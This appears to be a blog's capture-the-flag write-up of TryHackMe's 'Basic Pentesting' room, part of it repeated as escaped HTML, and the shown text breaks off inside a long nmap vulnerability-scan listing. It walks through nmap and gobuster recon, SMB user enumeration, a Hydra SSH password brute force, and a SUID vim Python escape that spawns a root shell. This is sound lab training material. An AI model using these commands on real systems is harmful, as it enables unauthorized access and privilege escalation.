\tCVE-2018-11784\t4.3\tvulners.com/cve/CVE-2018-11784\n|     \t1337DAY-ID-36546\t4.3\tvulners.com/zdt/1337DAY-ID-36546\t*EXPLOIT*\n|     \t1337DAY-ID-36545\t4.3\tvulners.com/zdt/1337DAY-ID-36545\t*EXPLOIT*\n|     \tTOMCAT:909935A4BEB7C54CD1FA804D13CDD890\t4.0\tvulners.com/tomcat/TOMCAT:909935A4BEB7C54CD1FA804D13CDD890\n|     \tCVE-2020-13943\t4.0\tvulners.com/cve/CVE-2020-13943\n|     \tSMNTC-111247\t0.0\tvulners.com/symantec/SMNTC-111247\n|_    \tSMNTC-111245\t0.0\tvulners.com/symantec/SMNTC-111245\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn&#039;t find wp-login.php\n|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable\nNo exact OS matches for host (If you know what OS is running on it, see nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.92%E=4%D=11/4%OT=22%CT=1%CU=34280%PV=Y%DS=4%DC=T%G=Y%TM=618494C\nOS:8%P=aarch64-unknown-linux-gnu)SEQ(SP=102%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS\nOS:=8)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M\nOS:506ST11NW7%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68\nOS:DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=\nOS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q\nOS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A\nOS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y\nOS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T\nOS:=40%CD=S)\n\nUptime guess: 0.019 days (since Thu Nov  4 19:52:32 2021)\nNetwork Distance: 4 hops\nTCP Sequence Prediction: Difficulty=258 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: false\n| smb-vuln-regsvc-dos: \n|   VULNERABLE:\n|   Service regsvc in Microsoft Windows systems vulnerable to denial of service\n|     State: VULNERABLE\n|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference\n|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes\n|       while working on smb-enum-sessions.\n|_          \n\nTRACEROUTE (using port 587/tcp)\nHOP RTT       ADDRESS\n1   30.62 ms  10.13.0.1\n2   ... 3\n4   172.85 ms 10.10.74.250\n\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at nmap.org/submit/ .\n# Nmap done at Thu Nov  4 20:19:52 2021 -- 1 IP address (1 host up) scanned in 1390.99 seconds\n\nAvailable services:\n\nOpenSSH 7.2p2 on port 22\nApache 2.4.18 on port 80\nSamba 3 or 4 on ports 139/445\nApache Jserve on port 8009\nApache Tomcat 9.0.7 on port 8080\n\nThe server looks to be running Ubuntu.\nGoing to http://10.10.74.250:80 revels a generic “maintenance” page, but there’s a note to “[c]heck our dev note section if you need to know what to work on.”\nGoing to http://10.10.74.250:8080 reveals what looks like the generic first-run Tomcat page. Poking around there doesn’t reveal any obvious modifications.\nFlag 1\nLet’s hit http://10.10.74.250:80 with gobuster and see what we find!\ngobuster dir \\\n\t-u http://10.10.74.250 \\\n\t-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\nIt looks like there’s a “hidden” directory here…\nFlags 2, 3, 4, and 5\nThis hidden directory contains two files.\ndev.txt:\n2018-04-23: I&#039;ve been messing with that struts stuff, and it&#039;s pretty cool! I think it might be neat\nto host that on this server too. Haven&#039;t made any real web apps yet, but I have tried that example\nyou get to show off how it works (and it&#039;s the REST version of the example!). Oh, and right now I&#039;m \nusing version 2.5.12, because other versions were giving me trouble. -K\n\n2018-04-22: SMB has been configured. -K\n\n2018-04-21: I got Apache set up. Will put in our content later. -J\n\nOkay, so we’ve got two users, “J” and “K”, and an example REST app of some kind (using Apache Struts?) with version 2.5.12.\nj.txt:\nFor J:\n\nI&#039;ve been auditing the contents of /etc/shadow to make sure we don&#039;t have any weak credentials,\nand I was able to crack your hash really easily. You know our password policy, so please follow\nit? Change that password ASAP.\n\n-K\n\nSeems like J has a weak password.\nFrom a quick check of the Hydra man page, it looks like we can feed it a list of usernames with the -L option. I’m going to make a couple assumptions:\n\nUsernames are probably English-language first names. I’m guessing this because the comments in the /development directory are in English, and because this is supposed to be an “easy” CTF.\nThe password is probably listed in the rockyou.txt dump. Again, both because of the comment, and because this is an “easy” CTF.\n\nA couple of quick searches on DuckDuckGo landed me on this list of common usernames; I’m going to filter that down to just the Js and then feed it + rockyou.txt into Hydra.\nhydra -t 4 -L j.txt -P rockyou.txt -vV 10.10.74.250 ssh\nExcept… That’s going to take forever. The hint suggests looking at Samba to find usernames, which is a good reminder.\nI thought I had some notes about how to do this, but it looks like I don’t. But a little bit of search brings me to Nmap SMB Scripts and SMB Enumeration Step-By-Step Pentesting Guide. To Nmap again!\nnmap -vv -oA basic-pentesting-enumerate-smb -sT \\\n     --script smb-enum-users.nse -p445 10.10.74.250\nBut this doesn’t return any results (maybe it’s Windows-specific?).\nA bit more internet searching and I arrive at Enumerate SMB with Enum4linux &amp; Smbclient, which suggests using enum4linux.\nenum4linux -U 10.10.74.250\nBut this errors out on me before outputting any useful information. (It did list a user named krbtgt, but after getting excited and thinking this might be “K” I realized that this looked like it might be related to Kerberos… And a brief internet search confirmed this.)\nTrying to use the Metasploit module auxiliary/smb/smb_lookupsid as suggested in A Little Guide to SMB Enumeration just resulted in an error about the server not being “able to handle the encrypted request.”\nSwitching back to trying to get enum4linux to work, I tried calling it without the -U flag. This does a full enumeration, and in particular tries to “brute-force” usernames by guessing SIDs. This worked! (I still got the same error, but the enumeration continued…)\nLet’s turn back to Hydra, but now using the usernames we just found. I’m also going to try a shorter wordlist, because rockyou.txt is ridiculously long.\nhydra -t 4 -l $USERNAME -P /usr/share/wordlists/nmap.lst \\\n      -vV 10.10.74.250 ssh\nWe’ve got a match, and we’re in!\nenv -u SSH_AUTH_SOCK -u SSH_AGENT_PID \\\n\tssh $USERNAME@10.10.74.250\nFlag 6\nNow that we’re in, let’s see if we can escalate privileges.\nThe home directory we’re in is a little weird… It contains a single file (~/.lesshst), and is owned by root!\nHome directories are world-readable, so we can see what’s in the other user’s home. It looks more normal… But also contains a file called pass.bak, which looks like it might be our last flag (“the final password”). Unfortunately, it’s not world-readable, and neither are any of the history files in that directory.\nDoes the current user have sudo privileges? Running sudo -l suggests not.\nLet’s see if there are any interesting binaries on the system that the current user both has access to and I could potentially abuse.\nfind / -type f \\\n       -a \\( -perm -u+s -o -perm -g+s \\) \\\n       -exec ls -l {} \\; 2&gt; /dev/null\nAnd… /usr/bin/vim.basic is SUID root?!? GTFOBins suggests that this can lead to a privilege escalation if ViM is compiled with Python… And, indeed, running vim.basic --version reveals that this is the case.\nAdapting the escape from GTFOBins for the present case gives us:\nvim.basic -c &#039;:py3 import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-pc&quot;, &quot;reset; exec sh -p&quot;)&#039;\nAnd this indeed gives us root! With this new power, we can enter the second user’s home directory and read pass.bak for our final flag.\nElapsed Time: 3 h 19 min","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/basicpentestingjt&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;“Basic Pentesting” on TryHackMe&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;h2 id=&quot;background&quot;&gt;Background&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#background&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;The description of this CTF is sparse, but the goal seems to be to (1) enumerate the services on a machine, (2) brute force a login over &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt;, and (3) elevate privileges (presumably to root, but things are a little vague here).&lt;/p&gt;\n&lt;p&gt;For this attempt, the target machine IP is 10.10.74.250.&lt;/p&gt;\n&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#recon&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;We begin by running a full &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nmap&quot;&gt;Nmap&lt;/a&gt; scan:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -vv&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -oA&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; basic-pentesting&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -sS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; vuln&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;          -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.10.74.250&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Output:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Thu Nov  4 19:56:42 2021 as: nmap -vv -oA basic-pentesting -A -sS --script vuln -p- 10.10.74.250\nIncreasing send delay for 10.10.74.250 from 5 to 10 due to 11 out of 13 dropped probes since last increase.\nIncreasing send delay for 10.10.74.250 from 10 to 20 due to 11 out of 12 dropped probes since last increase.\nNmap scan report for 10.10.74.250\nHost is up, received timestamp-reply ttl 61 (0.17s latency).\nScanned at 2021-11-04 19:56:54 MDT for 1378s\nNot shown: 65529 closed tcp ports (reset)\nPORT     STATE SERVICE     REASON         VERSION\n22/tcp   open  ssh         syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)\n| vulners: \n|   cpe:/a:openbsd:openssh:7.2p2: \n|     \tPACKETSTORM:140070\t7.8\thttps://vulners.com/packetstorm/PACKETSTORM:140070\t*EXPLOIT*\n|     \tEXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09\t7.8\thttps://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09\t*EXPLOIT*\n|     \tEDB-ID:40888\t7.8\thttps://vulners.com/exploitdb/EDB-ID:40888\t*EXPLOIT*\n|     \tCVE-2016-8858\t7.8\thttps://vulners.com/cve/CVE-2016-8858\n|     \tCVE-2016-6515\t7.8\thttps://vulners.com/cve/CVE-2016-6515\n|     \t1337DAY-ID-26494\t7.8\thttps://vulners.com/zdt/1337DAY-ID-26494\t*EXPLOIT*\n|     \tSSV:92579\t7.5\thttps://vulners.com/seebug/SSV:92579\t*EXPLOIT*\n|     \tCVE-2016-10009\t7.5\thttps://vulners.com/cve/CVE-2016-10009\n|     \t1337DAY-ID-26576\t7.5\thttps://vulners.com/zdt/1337DAY-ID-26576\t*EXPLOIT*\n|     \tSSV:92582\t7.2\thttps://vulners.com/seebug/SSV:92582\t*EXPLOIT*\n|     \tCVE-2016-10012\t7.2\thttps://vulners.com/cve/CVE-2016-10012\n|     \tCVE-2015-8325\t7.2\thttps://vulners.com/cve/CVE-2015-8325\n|     \tSSV:92580\t6.9\thttps://vulners.com/seebug/SSV:92580\t*EXPLOIT*\n|     \tCVE-2016-10010\t6.9\thttps://vulners.com/cve/CVE-2016-10010\n|     \t1337DAY-ID-26577\t6.9\thttps://vulners.com/zdt/1337DAY-ID-26577\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/SUSE-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/SUSE-CVE-2019-25017/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-AIX-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/F5-BIG-IP-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/DEBIAN-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tEXPLOITPACK:98FE96309F9524B8C84C508837551A19\t5.8\thttps://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19\t*EXPLOIT*\n|     \tEXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97\t5.8\thttps://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97\t*EXPLOIT*\n|     \tEDB-ID:46516\t5.8\thttps://vulners.com/exploitdb/EDB-ID:46516\t*EXPLOIT*\n|     \tCVE-2019-6111\t5.8\thttps://vulners.com/cve/CVE-2019-6111\n|     \t1337DAY-ID-32328\t5.8\thttps://vulners.com/zdt/1337DAY-ID-32328\t*EXPLOIT*\n|     \t1337DAY-ID-32009\t5.8\thttps://vulners.com/zdt/1337DAY-ID-32009\t*EXPLOIT*\n|     \tSSV:91041\t5.5\thttps://vulners.com/seebug/SSV:91041\t*EXPLOIT*\n|     \tPACKETSTORM:140019\t5.5\thttps://vulners.com/packetstorm/PACKETSTORM:140019\t*EXPLOIT*\n|     \tPACKETSTORM:136234\t5.5\thttps://vulners.com/packetstorm/PACKETSTORM:136234\t*EXPLOIT*\n|     \tEXPLOITPACK:F92411A645D85F05BDBD274FD222226F\t5.5\thttps://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F\t*EXPLOIT*\n|     \tEXPLOITPACK:9F2E746846C3C623A27A441281EAD138\t5.5\thttps://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138\t*EXPLOIT*\n|     \tEXPLOITPACK:1902C998CBF9154396911926B4C3B330\t5.5\thttps://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330\t*EXPLOIT*\n|     \tEDB-ID:40858\t5.5\thttps://vulners.com/exploitdb/EDB-ID:40858\t*EXPLOIT*\n|     \tCVE-2016-3115\t5.5\thttps://vulners.com/cve/CVE-2016-3115\n|     \tSSH_ENUM\t5.0\thttps://vulners.com/canvas/SSH_ENUM\t*EXPLOIT*\n|     \tPACKETSTORM:150621\t5.0\thttps://vulners.com/packetstorm/PACKETSTORM:150621\t*EXPLOIT*\n|     \tMSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS\t5.0\thttps://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS\t*EXPLOIT*\n|     \tEXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0\t5.0\thttps://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0\t*EXPLOIT*\n|     \tEXPLOITPACK:EBDBC5685E3276D648B4D14B75563283\t5.0\thttps://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283\t*EXPLOIT*\n|     \tEDB-ID:45939\t5.0\thttps://vulners.com/exploitdb/EDB-ID:45939\t*EXPLOIT*\n|     \tCVE-2018-15919\t5.0\thttps://vulners.com/cve/CVE-2018-15919\n|     \tCVE-2018-15473\t5.0\thttps://vulners.com/cve/CVE-2018-15473\n|     \tCVE-2017-15906\t5.0\thttps://vulners.com/cve/CVE-2017-15906\n|     \tCVE-2016-10708\t5.0\thttps://vulners.com/cve/CVE-2016-10708\n|     \t1337DAY-ID-31730\t5.0\thttps://vulners.com/zdt/1337DAY-ID-31730\t*EXPLOIT*\n|     \tEDB-ID:45233\t4.6\thttps://vulners.com/exploitdb/EDB-ID:45233\t*EXPLOIT*\n|     \tEDB-ID:40963\t4.6\thttps://vulners.com/exploitdb/EDB-ID:40963\t*EXPLOIT*\n|     \tEDB-ID:40962\t4.6\thttps://vulners.com/exploitdb/EDB-ID:40962\t*EXPLOIT*\n|     \tCVE-2021-41617\t4.4\thttps://vulners.com/cve/CVE-2021-41617\n|     \tMSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/F5-BIG-IP-CVE-2020-14145/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/\t*EXPLOIT*\n|     \tEXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF\t4.3\thttps://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF\t*EXPLOIT*\n|     \tEXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF\t4.3\thttps://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF\t*EXPLOIT*\n|     \tCVE-2020-14145\t4.3\thttps://vulners.com/cve/CVE-2020-14145\n|     \tCVE-2016-6210\t4.3\thttps://vulners.com/cve/CVE-2016-6210\n|     \t1337DAY-ID-25440\t4.3\thttps://vulners.com/zdt/1337DAY-ID-25440\t*EXPLOIT*\n|     \t1337DAY-ID-25438\t4.3\thttps://vulners.com/zdt/1337DAY-ID-25438\t*EXPLOIT*\n|     \tCVE-2019-6110\t4.0\thttps://vulners.com/cve/CVE-2019-6110\n|     \tCVE-2019-6109\t4.0\thttps://vulners.com/cve/CVE-2019-6109\n|     \tCVE-2018-20685\t2.6\thttps://vulners.com/cve/CVE-2018-20685\n|     \tSSV:92581\t2.1\thttps://vulners.com/seebug/SSV:92581\t*EXPLOIT*\n|     \tCVE-2016-10011\t2.1\thttps://vulners.com/cve/CVE-2016-10011\n|     \tPACKETSTORM:151227\t0.0\thttps://vulners.com/packetstorm/PACKETSTORM:151227\t*EXPLOIT*\n|     \tPACKETSTORM:140261\t0.0\thttps://vulners.com/packetstorm/PACKETSTORM:140261\t*EXPLOIT*\n|     \tPACKETSTORM:138006\t0.0\thttps://vulners.com/packetstorm/PACKETSTORM:138006\t*EXPLOIT*\n|     \tPACKETSTORM:137942\t0.0\thttps://vulners.com/packetstorm/PACKETSTORM:137942\t*EXPLOIT*\n|     \tEDB-ID:46193\t0.0\thttps://vulners.com/exploitdb/EDB-ID:46193\t*EXPLOIT*\n|     \tEDB-ID:40136\t0.0\thttps://vulners.com/exploitdb/EDB-ID:40136\t*EXPLOIT*\n|     \tEDB-ID:40113\t0.0\thttps://vulners.com/exploitdb/EDB-ID:40113\t*EXPLOIT*\n|     \tEDB-ID:39569\t0.0\thttps://vulners.com/exploitdb/EDB-ID:39569\t*EXPLOIT*\n|     \t1337DAY-ID-30937\t0.0\thttps://vulners.com/zdt/1337DAY-ID-30937\t*EXPLOIT*\n|_    \t1337DAY-ID-10010\t0.0\thttps://vulners.com/zdt/1337DAY-ID-10010\t*EXPLOIT*\n80/tcp   open  http        syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))\n|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable\n| http-enum: \n|_  /development/: Potentially interesting directory w/ listing on &#039;apache/2.4.18 (ubuntu)&#039;\n|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn&#039;t find wp-login.php\n| vulners: \n|   cpe:/a:apache:http_server:2.4.18: \n|     \tCVE-2021-39275\t7.5\thttps://vulners.com/cve/CVE-2021-39275\n|     \tCVE-2021-26691\t7.5\thttps://vulners.com/cve/CVE-2021-26691\n|     \tCVE-2017-7679\t7.5\thttps://vulners.com/cve/CVE-2017-7679\n|     \tCVE-2017-7668\t7.5\thttps://vulners.com/cve/CVE-2017-7668\n|     \tCVE-2017-3169\t7.5\thttps://vulners.com/cve/CVE-2017-3169\n|     \tCVE-2017-3167\t7.5\thttps://vulners.com/cve/CVE-2017-3167\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/\t7.2\thttps://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/\t7.2\thttps://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/\t*EXPLOIT*\n|     \tEXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB\t7.2\thttps://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB\t*EXPLOIT*\n|     \tCVE-2019-0211\t7.2\thttps://vulners.com/cve/CVE-2019-0211\n|     \t1337DAY-ID-32502\t7.2\thttps://vulners.com/zdt/1337DAY-ID-32502\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1312/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/SUSE-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     